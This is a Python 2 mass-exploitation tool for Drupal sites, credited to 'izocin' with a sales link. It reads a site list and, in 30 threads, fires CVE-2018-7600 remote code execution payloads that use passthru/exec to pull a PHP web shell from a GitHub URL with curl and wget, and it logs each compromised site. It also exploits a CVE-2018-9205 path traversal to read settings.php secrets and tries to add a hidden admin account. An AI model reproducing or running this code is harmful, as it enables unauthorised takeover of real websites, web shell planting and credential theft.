#!/usr/bin/python

# Coded By izocin 
# Turkey

import requests, re,urllib, urllib2, os, sys, codecs,binascii, json, argparse					
from multiprocessing.dummy import Pool					     	
from time import time as timer	
import time
from random import sample as rand
from Queue import Queue				   		
from platform import system
from urlparse import urlparse
from optparse import OptionParser	
from colorama import Fore								
from colorama import Style								
from pprint import pprint								
from colorama import init												
init(autoreset=True)
										
															
####### Colors	 ######	
	
fr  =   Fore.RED											
fc  =   Fore.CYAN											
fw  =   Fore.WHITE											
fg  =   Fore.GREEN											
sd  =   Style.DIM											
sn  =   Style.NORMAL										
sb  =   Style.BRIGHT										

####################### 
try:
    dork = raw_input("Write Drupal site list name \n")
    with codecs.open(dork, mode='r', encoding='ascii', errors='ignore') as f:
        ooo = f.read().splitlines()
except IOError:
    pass
ooo = list((ooo))



def banners():


	if system() == 'Linux':
		os.system('clear')
	if system() == 'Windows':
		os.system('cls')
		
		banner = """{}{} \n \n



		
                                                                
                                                                
                                                                
  ,--,                                      ,--,                
,--.'|          ,----,   ,---.            ,--.'|         ,---,  
|  |,         .'   .`|  '   ,'\           |  |,      ,-+-. /  | 
`--'_      .'   .'  .' /   /   |   ,---.  `--'_     ,--.'|'   | 
,' ,'|   ,---, '   ./ .   ; ,. :  /     \ ,' ,'|   |   |  ,"' | 
'  | |   ;   | .'  /  '   | |: : /    / ' '  | |   |   | /  | | 
|  | :   `---' /  ;--,'   | .; :.    ' /  |  | :   |   | |  | | 
'  : |__   /  /  / .`||   :    |'   ; :__ '  : |__ |   | |  |/  
|  | '.'|./__;     .'  \   \  / '   | '.'||  | '.'||   | |--'   
;  :    ;;   |  .'      `----'  |   :    :;  :    ;|   |/       
|  ,   / `---'                   \   \  / |  ,   / '---'        
 ---`-'                           `----'   ---`-'               
                                                                
     
 
 
	Coded By: izocin , https://selly.gg/@kingmaster
									
   
    

		\n""".format(fc, sb)
		
		print banner
 

jceupshell = "ups/root.php"




Agent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
user_agent = "Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A334 Safari/7534.48.3"


def rand_str (len = None) :
	if len == None :
		len = 8
	return ''.join (rand ('abcdefghijklmnopqrstuvwxyz', len))
	
def prepare(url, ua):
	try:
		global user_agent
		headers = {
			'User-Agent' : user_agent,
			'x-forwarded-for' : ua
		}
		cookies = urllib2.Request(url, headers=headers)
		result = urllib2.urlopen(cookies)
		cookieJar = result.info().getheader('Set-Cookie')
		injection = urllib2.Request(url, headers=headers)
		injection.add_header('Cookie', cookieJar)
		urllib2.urlopen(injection)
	except:
		pass
def toCharCode(string):
	try:
		encoded = ""
		for char in string:
			encoded += "chr({0}).".format(ord(char))
		return encoded[:-1]
	except:
		pass
def drurce(url):

    try:	


		# 22 . rev


		get_params = {'q':'user/password', 'name[#post_render][]':'passthru', 'name[#markup]':'curl https://raw.githubusercontent.com/izoking/2/master/u.php && wget https://raw.githubusercontent.com/izoking/2/master/u.php', 'name[#type]':'markup'}
		post_params = {'form_id':'user_pass', '_triggering_element_name':'name'}
		r = requests.post(url, data=post_params, params=get_params)
		
		
		m = re.search(r'<input type="hidden" name="form_build_id" value="([^"]+)" />', r.text)
		if m:
		    found = m.group(1)
		
		get_params = {'q':'file/ajax/name/#value/' + found}
		post_params = {'form_build_id':found}
		r = requests.post(url, data=post_params, params=get_params)

		lib = requests.get(url+'/u.php')
		
		
		if re.findall("izocin", lib.content):
			print '[{}Drupal]: {} {}	       ====> {}{} CVE-2018-7600 RCE V7     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/u.php'+'\n')
			sys.exit()

		get_params = {'q':'user/password', 'name[#post_render][]':'passthru', 'name[#markup]':'mv+sites/default/files/.htaccess+htaccessx;curl+-o+sites/default/files/info.php+"https://raw.githubusercontent.com/izoking/2/master/u.php"', 'name[#type]':'markup'}
		post_params = {'form_id':'user_pass', '_triggering_element_name':'name'}
		r = requests.post(url, data=post_params, params=get_params)
		
		
		m = re.search(r'<input type="hidden" name="form_build_id" value="([^"]+)" />', r.text)
		if m:
		    found = m.group(1)
		
		get_params = {'q':'file/ajax/name/#value/' + found}
		post_params = {'form_build_id':found}
		r = requests.post(url, data=post_params, params=get_params)

		lib = requests.get(url+'/u.php')
		
		
		if re.findall("izocin", lib.content):
			print '[{}Drupal]: {} {}	       ====> {}{} CVE-2018-7600 RCE V7     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/u.php'+'\n')
			sys.exit()			
  
		payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': 'wget https://raw.githubusercontent.com/izoking/2/master/u.php && curl https://raw.githubusercontent.com/izoking/2/master/u.php'}
		headers = {'User-Agent': 'Mozilla 5.0'}				
		r = requests.post(url+ '/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax', data=payload, verify=False, headers=headers)
		if 'izocin' in requests.get(url+'/u.php', headers=headers).text:
			print '[{}Drupal]: {} {}	       ====> {}{} CVE-2018-7600 RCE V8    {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/u.php'+'\n')
			sys.exit()	
		else:
			print '[{}Drupal]: {} {}	       ====> {}{} CVE-2018-7600 RCE     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)


		ddrevlib = requests.get(url+"/sites/all/modules/avatar_uploader/lib/demo/view.php?file=../../../../../../../../../../../sites/default/settings.php")
				
		if 'drupal_hash_salt' in ddrevlib.content:
			print '[{}Drupal]: {} {}	       ====> {}{} CVE-2018-9205     {}{} Success  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Configs.txt', 'a').write(url+'/sites/all/modules/avatar_uploader/lib/demo/view.php?file=../../../../../../../../../../../sites/default/settings.php'+'\n')
		else:
			print '[{}Drupal]: {} {}	       ====> {}{} CVE-2018-9205     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)				
			
	

		# 22 . rev
			
		openurl = urllib2.urlopen('http://localhost/dru.php?url='+url+'&submit=submit')
		readcontent = openurl.read()
		if 'Success!' in readcontent:
					print '[{}Drupal]: {} {}	       ====> {}{} Add Admin    {}{} Success  '.format(sb, sd, url, fc,fc, sb,fg)
					open('Vulns/Drupal-admin.txt', 'a').write(url+'/user/login user:gassrini pass:admin'+'\n')				
		else:
			print '[{}Drupal]: {} {}	       ====> {}{} Add Admin     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)			
			
    except:
        pass


banners()

	
def Main():
    try:
		
        start = timer()
        ThreadPool = Pool(30)
        Threads = ThreadPool.map(drurce, ooo)
        print('Time: ' + str(timer() - start) + ' seconds')
    except:
        pass


if __name__ == '__main__':
    Main()    
